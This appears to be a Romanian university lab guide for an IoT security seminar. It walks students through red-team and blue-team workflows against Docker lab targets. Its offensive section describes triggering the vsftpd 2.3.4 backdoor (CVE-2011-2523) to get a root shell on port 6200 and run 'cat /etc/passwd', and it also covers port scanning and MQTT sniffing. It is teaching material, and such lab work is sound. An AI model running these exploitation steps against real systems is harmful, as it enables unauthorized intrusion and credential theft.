# Flux de Lucru pentru Laboratorul de Securitate IoT

## Cuprins

1. [Metodologia Generală](#1-metodologia-generală)
2. [Setup și Pregătire](#2-setup-și-pregătire)
3. [Workflow Ofensiv (Red Team)](#3-workflow-ofensiv-red-team)
4. [Workflow Defensiv (Blue Team)](#4-workflow-defensiv-blue-team)
5. [Integrare și Raportare](#5-integrare-și-raportare)
6. [Troubleshooting](#6-troubleshooting)

---

## 1. Metodologia Generală

### 1.1 Abordarea Duală: Atacator vs. Apărător

Laboratorul este structurat pentru a oferi ambele perspective în securitate:

```
┌─────────────────────────────────────────────────────────────────┐
│                    DUAL PERSPECTIVE APPROACH                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────────┐    ┌─────────────────────────┐    │
│  │      RED TEAM           │    │      BLUE TEAM          │    │
│  │      (Ofensiv)          │    │      (Defensiv)         │    │
│  ├─────────────────────────┤    ├─────────────────────────┤    │
│  │                         │    │                         │    │
│  │  1. Reconnaissance      │    │  1. Asset Discovery     │    │
│  │     - Port scanning     │    │     - Network mapping   │    │
│  │     - Service detection │    │     - Inventory         │    │
│  │                         │    │                         │    │
│  │  2. Vulnerability       │    │  2. Hardening           │    │
│  │     - CVE lookup        │    │     - Configuration     │    │
│  │     - Misconfiguration  │    │     - Patching          │    │
│  │                         │    │                         │    │
│  │  3. Exploitation        │    │  3. Monitoring          │    │
│  │     - Proof of concept  │    │     - IDS/IPS           │    │
│  │     - Impact demo       │    │     - Logging           │    │
│  │                         │    │                         │    │
│  │  4. Reporting           │    │  4. Incident Response   │    │
│  │     - Document findings │    │     - Containment       │    │
│  │     - Recommendations   │    │     - Recovery          │    │
│  │                         │    │                         │    │
│  └─────────────────────────┘    └─────────────────────────┘    │
│                                                                 │
│                    ┌─────────────────┐                         │
│                    │   INTEGRATION   │                         │
│                    ├─────────────────┤                         │
│                    │ Purple Team     │                         │
│                    │ collaboration   │                         │
│                    │ for improvement │                         │
│                    └─────────────────┘                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Structura Laboratorului

**Timpul estimat: 2 ore (seminar)**

| Fază | Durată | Activitate |
|------|--------|------------|
| Setup | 15 min | Pornire infrastructură, verificare |
| Demo Ofensiv | 30 min | Scanare, vulnerabilități, exploit |
| Demo Defensiv | 30 min | Segmentare, TLS, monitorizare |
| Exerciții | 30 min | Practică individuală/echipă |
| Raportare | 15 min | Generare raport, discuții |

---

## 2. Setup și Pregătire

### 2.1 Verificare Cerințe

**Comandă rapidă de verificare:**

```bash
# Verificare completă a mediului
make check

# Sau manual:
./scripts/setup.sh --check
```

**Output așteptat:**

```
[✓] Python 3.8+ installed (3.10.12)
[✓] Required modules available
[✓] Docker installed and running
[✓] Certificates present
[✓] Mosquitto available
[✓] tcpdump accessible
[✓] Mininet installed

Environment ready for Week 13 lab!
```

### 2.2 Instalare Dependențe

**Pentru sistem complet:**

```bash
# Instalare completă (necesită sudo)
sudo ./scripts/setup.sh --apt --pip --certs --passwd

# Doar Python packages (fără sudo pentru pip)
./scripts/setup.sh --pip

# Doar generare certificate
./scripts/setup.sh --certs
```

### 2.3 Pornire Infrastructură

**Workflow standard de pornire:**

```bash
# Pasul 1: Pornire containere Docker
make docker-up

# Verificare:
docker ps
# Așteptat: 5 containere running
# - dvwa (80)
# - webgoat (8080)
# - vsftpd (21, 6200)
# - mosquitto (1883, 8883)
# - attacker (tools)

# Pasul 2: Verificare conectivitate
make test-connectivity

# Pasul 3: (Opțional) Pornire Mininet
make mininet-base
```

---

## 3. Workflow Ofensiv (Red Team)

### 3.1 Faza 1: Reconnaissance

**Diagrama fluxului:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    RECONNAISSANCE WORKFLOW                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  START                                                          │
│    │                                                            │
│    ▼                                                            │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 1. NETWORK DISCOVERY                                     │   │
│  │    python3 python/exercises/ex_01_port_scanner.py       │   │
│  │    --target 172.20.0.0/24 --discovery                    │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 2. PORT SCANNING                                         │   │
│  │    python3 python/exercises/ex_01_port_scanner.py       │   │
│  │    --target <discovered_ip> --ports 1-1024              │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 3. SERVICE IDENTIFICATION                                │   │
│  │    python3 python/utils/banner_grabber.py               │   │
│  │    --target <ip> --ports 21,22,80,1883                   │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│                        ┌─────────────────┐                     │
│                        │ OUTPUT: JSON    │                     │
│                        │ scan_results/   │                     │
│                        └─────────────────┘                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Comenzi pas cu pas:**

```bash
# 1. Descoperire hosturi în rețea Docker
python3 python/exercises/ex_01_port_scanner.py \
    --target 172.20.0.1-10 \
    --discovery \
    --output /tmp/hosts.json

# 2. Scanare porturi pe target-uri descoperite
python3 python/exercises/ex_01_port_scanner.py \
    --target 172.20.0.2 \
    --ports 1-1024 \
    --threads 50 \
    --output /tmp/ports.json

# 3. Banner grabbing pentru identificare servicii
python3 python/utils/banner_grabber.py \
    --target 172.20.0.2 \
    --ports 21,80,1883 \
    --output /tmp/banners.json
```

### 3.2 Faza 2: Vulnerability Assessment

**Diagrama fluxului:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    VULNERABILITY ASSESSMENT                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  INPUT: scan_results/banners.json                               │
│    │                                                            │
│    ▼                                                            │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 1. CVE LOOKUP                                            │   │
│  │    python3 python/exercises/ex_04_vuln_checker.py       │   │
│  │    --input banners.json --mode cve                       │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 2. CONFIGURATION CHECK                                   │   │
│  │    python3 python/exercises/ex_04_vuln_checker.py       │   │
│  │    --input banners.json --mode config                    │   │
│  │                                                          │   │
│  │    Verifică:                                             │   │
│  │    • MQTT anonymous access                               │   │
│  │    • FTP anonymous login                                 │   │
│  │    • HTTP directory listing                              │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 3. CVSS SCORING                                          │   │
│  │    Calculează scor de risc pentru fiecare vulnerabilitate│   │
│  │    Prioritizează după: CRITICAL > HIGH > MEDIUM > LOW    │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│                        ┌─────────────────┐                     │
│                        │ OUTPUT: JSON    │                     │
│                        │ vulns_report/   │                     │
│                        └─────────────────┘                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Comenzi:**

```bash
# Verificare vulnerabilități CVE
python3 python/exercises/ex_04_vuln_checker.py \
    --target 172.20.0.2 \
    --ports 21,80,1883 \
    --output /tmp/vulns.json

# Output exemplu:
# [CRITICAL] Port 21: vsftpd 2.3.4 - CVE-2011-2523 (CVSS 10.0)
# [HIGH] Port 1883: MQTT anonymous access allowed
# [MEDIUM] Port 80: Directory listing enabled
```

### 3.3 Faza 3: Exploitation

**Diagrama pentru exploatarea vsftpd:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    EXPLOITATION WORKFLOW                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  INPUT: vulns_report (CVE-2011-2523)                            │
│    │                                                            │
│    ▼                                                            │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 1. EXPLOIT SELECTION                                     │   │
│  │    → python/exploits/ftp_backdoor_vsftpd.py             │   │
│  │    Vulnerabilitate: backdoor în vsftpd 2.3.4            │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 2. TRIGGER BACKDOOR                                      │   │
│  │    FTP CONNECT → USER xxx:) → PASS xxx                   │   │
│  │    Activează listener pe port 6200                       │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 3. CONNECT TO SHELL                                      │   │
│  │    TCP CONNECT to port 6200                              │   │
│  │    → Interactive root shell                              │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 4. POST-EXPLOITATION (demonstrativ)                      │   │
│  │    • id (confirm root)                                   │   │
│  │    • cat /etc/passwd                                     │   │
│  │    • Document impact                                     │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│                        ┌─────────────────┐                     │
│                        │ OUTPUT: Log     │                     │
│                        │ + Evidence      │                     │
│                        └─────────────────┘                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Comenzi:**

```bash
# Exploatare vsftpd 2.3.4
python3 python/exploits/ftp_backdoor_vsftpd.py \
    --target 172.20.0.2 \
    --port 21 \
    --command "id; cat /etc/passwd" \
    --output /tmp/exploit_evidence.txt

# Output:
# [*] Connecting to 172.20.0.2:21
# [*] Banner: 220 (vsFTPd 2.3.4)
# [*] Triggering backdoor...
# [+] Backdoor activated!
# [+] Shell obtained on port 6200
# [+] Command output:
# uid=0(root) gid=0(root) groups=0(root)
# root:x:0:0:root:/root:/bin/bash
# ...
```

### 3.4 Faza 4: MQTT Interception

```bash
# Capturare trafic MQTT necriptat
sudo python3 python/exercises/ex_03_packet_sniffer.py \
    --interface docker0 \
    --filter mqtt \
    --count 100 \
    --output /tmp/mqtt_capture.json

# Simultan, în alt terminal:
# Generare trafic MQTT
python3 python/exercises/ex_02_mqtt_client.py \
    --host 172.20.0.4 \
    --port 1883 \
    --action publish \
    --topic "sensors/temp" \
    --message "23.5"
```

---

## 4. Workflow Defensiv (Blue Team)

### 4.1 Segmentarea Rețelei

**Diagrama implementării:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    NETWORK SEGMENTATION WORKFLOW                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 1. START MININET SEGMENTED TOPOLOGY                      │   │
│  │    sudo python3 mininet/topologies/topo_segmented.py    │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 2. VERIFY ZONE SEPARATION                                │   │
│  │                                                          │   │
│  │    Zone IoT (10.0.1.0/24)      Zone MGMT (10.0.2.0/24)  │   │
│  │    ├── sensor1 (.11)           ├── broker (.100)        │   │
│  │    ├── sensor2 (.12)           ├── controller (.20)     │   │
│  │    └── sensor3 (.13)           └── admin (.200)         │   │
│  │                                                          │   │
│  │              ┌─────────────────┐                         │   │
│  │              │   Router (r1)   │                         │   │
│  │              │   Firewall      │                         │   │
│  │              └─────────────────┘                         │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 3. TEST FIREWALL RULES                                   │   │
│  │    --scenario isolation                                  │   │
│  │                                                          │   │
│  │    ✓ sensor1 → broker:1883  ALLOWED                     │   │
│  │    ✗ sensor1 → broker:22    BLOCKED                     │   │
│  │    ✗ sensor1 → sensor2      BLOCKED (lateral)           │   │
│  │    ✓ admin → sensor1        ALLOWED                     │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 4. VERIFY BLOCKED TRAFFIC LOGS                           │   │
│  │    dmesg | grep "FW-BLOCKED"                             │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Comenzi:**

```bash
# Pornire topologie segmentată
sudo python3 mininet/topologies/topo_segmented.py --scenario isolation

# În CLI Mininet:
# Test MQTT permis
sensor1 mosquitto_pub -h 10.0.2.100 -p 1883 -t test -m hello
# → SUCCESS

# Test SSH blocat
sensor1 ssh admin@10.0.2.100
# → BLOCKED by firewall

# Test lateral movement blocat
sensor1 ping sensor2
# → BLOCKED by firewall

# Verificare loguri
r1 dmesg | grep "FW-BLOCKED"
# → [FW-BLOCKED] IN=r1-eth0 OUT=r1-eth0 SRC=10.0.1.11 DST=10.0.1.12
```

### 4.2 Configurare TLS

**Flux de implementare:**

```bash
# 1. Generare certificate
./scripts/setup.sh --certs

# 2. Verificare certificate
ls -la configs/certs/
# ca.crt, server.crt, server.key, client.crt, client.key

# 3. Testare cu configurația TLS
mosquitto -c configs/mosquitto/tls.conf -v &

# 4. Conectare client cu TLS
python3 python/exercises/ex_02_mqtt_client.py \
    --host localhost \
    --port 8883 \
    --tls \
    --ca-cert configs/certs/ca.crt \
    --action subscribe \
    --topic "sensors/#"

# 5. Verificare că plaintext este blocat
mosquitto_sub -h localhost -p 1883 -t "#"
# → Connection refused (port 1883 disabled)
```

### 4.3 Monitorizare și Detecție

**Workflow de monitorizare:**

```bash
# Terminal 1: Pornire sniffer pentru detecție
sudo python3 python/exercises/ex_03_packet_sniffer.py \
    --interface docker0 \
    --filter docker \
    --verbose

# Terminal 2: Simulare atac pentru detecție
python3 python/exercises/ex_01_port_scanner.py \
    --target 172.20.0.2 \
    --ports 1-1000 \
    --threads 100

# Output sniffer:
# [ALERT] Port scan detected from 172.20.0.1
# [ALERT] Multiple SYN without ACK pattern
# [INFO] Unusual traffic volume: 500 pkts/sec
```

---

## 5. Integrare și Raportare

### 5.1 Generare Raport Complet

**Workflow end-to-end:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    REPORT GENERATION WORKFLOW                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 1. COLLECT DATA                                          │   │
│  │    scan_results/*.json                                   │   │
│  │    vulns_report/*.json                                   │   │
│  │    exploit_evidence/*.txt                                │   │
│  │    packet_captures/*.json                                │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 2. IMPORT INTO REPORT GENERATOR                          │   │
│  │    python3 python/utils/report_generator.py             │   │
│  │    --import-dir /tmp/evidence/                           │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 3. GENERATE OUTPUTS                                      │   │
│  │    --format html  → Security_Report.html                │   │
│  │    --format md    → Security_Report.md                  │   │
│  │    --format json  → Security_Report.json                │   │
│  └───────────────────────────────┬─────────────────────────┘   │
│                                  │                              │
│                                  ▼                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 4. REVIEW AND SUBMIT                                     │   │
│  │    • Open HTML in browser                               │   │
│  │    • Verify all findings documented                     │   │
│  │    • Check recommendations                              │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Comenzi:**

```bash
# Generare raport din toate datele colectate
python3 python/utils/report_generator.py \
    --import-dir /tmp/evidence \
    --format html \
    --output Security_Assessment_Report.html

# Sau folosind Makefile:
make report
```

### 5.2 Structura Raportului

**Template raport de securitate:**

```markdown
# Security Assessment Report
## Week 13 - IoT and Network Security

### Executive Summary
- Scope: Docker infrastructure with IoT components
- Period: [date]
- Assessors: [names]
- Overall Risk: HIGH

### Findings Summary
| Severity | Count |
|----------|-------|
| Critical | 1     |
| High     | 2     |
| Medium   | 3     |
| Low      | 1     |

### Detailed Findings

#### CRITICAL-01: vsftpd 2.3.4 Backdoor (CVE-2011-2523)
- **Asset**: 172.20.0.2:21
- **CVSS**: 10.0
- **Description**: Supply chain attack with hardcoded backdoor
- **Evidence**: Shell access demonstrated on port 6200
- **Recommendation**: Update to vsftpd 3.0+

#### HIGH-01: MQTT Anonymous Access
- **Asset**: 172.20.0.4:1883
- **Description**: Broker allows unauthenticated connections
- **Evidence**: Successfully subscribed to all topics (#)
- **Recommendation**: Enable authentication, implement ACLs

[...]

### Recommendations Priority Matrix
| Finding | Effort | Impact | Priority |
|---------|--------|--------|----------|
| CRIT-01 | Low    | High   | Immediate|
| HIGH-01 | Medium | High   | Short-term|
| HIGH-02 | Low    | Medium | Short-term|

### Appendices
- A: Port Scan Results
- B: Packet Captures
- C: Exploit Logs
```

---

## 6. Troubleshooting

### 6.1 Probleme Comune

| Problemă | Cauză | Soluție |
|----------|-------|---------|
| Docker containers not starting | Docker daemon not running | `sudo systemctl start docker` |
| Permission denied for sniffer | Need root for raw sockets | `sudo python3 ...` |
| MQTT connection refused | Broker not running | `make docker-up` |
| Mininet errors | Previous session not cleaned | `sudo mn -c` |
| Certificates not found | Setup not complete | `./scripts/setup.sh --certs` |
| Port already in use | Previous process running | `sudo lsof -i :PORT` then kill |

### 6.2 Verificări Rapide

```bash
# Verificare Docker
docker ps -a
docker logs mosquitto

# Verificare porturi
ss -tulpn | grep -E "21|80|1883|8883"

# Verificare Mininet
sudo mn --test pingall

# Cleanup forțat
sudo mn -c
docker-compose down -v
pkill -f mosquitto
```

### 6.3 Reset Complet

```bash
# Reset total al mediului de laborator
make clean-all

# Sau manual:
docker-compose down -v
sudo mn -c
rm -rf /tmp/evidence/*
rm -rf configs/certs/*

# Repornire de la zero:
make setup
make docker-up
```

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────────┐
│                    QUICK REFERENCE                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SETUP                                                          │
│  ─────                                                          │
│  make setup          # Install dependencies                     │
│  make docker-up      # Start containers                         │
│  make check          # Verify environment                       │
│                                                                 │
│  OFFENSIVE                                                      │
│  ─────────                                                      │
│  make scan TARGET=IP        # Port scan                         │
│  make banner TARGET=IP      # Service detection                 │
│  make vuln-check TARGET=IP  # CVE lookup                        │
│  make exploit-vsftpd        # Demo exploit                      │
│  make sniff                 # Packet capture                    │
│                                                                 │
│  DEFENSIVE                                                      │
│  ─────────                                                      │
│  make mininet-base          # Basic topology                    │
│  make mininet-extended      # Segmented topology                │
│  make mqtt-secure           # Start with TLS                    │
│  make monitor               # IDS monitoring                    │
│                                                                 │
│  REPORTING                                                      │
│  ─────────                                                      │
│  make report                # Generate HTML report              │
│  make clean                 # Cleanup                           │
│                                                                 │
│  TARGETS                                                        │
│  ───────                                                        │
│  DVWA:     172.20.0.3:80                                       │
│  WebGoat:  172.20.0.5:8080                                     │
│  vsftpd:   172.20.0.2:21                                       │
│  MQTT:     172.20.0.4:1883 (plain), :8883 (TLS)                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

*Document generat pentru Săptămâna 13 - Rețele de Calculatoare, ASE-CSIE*
*Autor: Colectivul de Tehnologii Web*
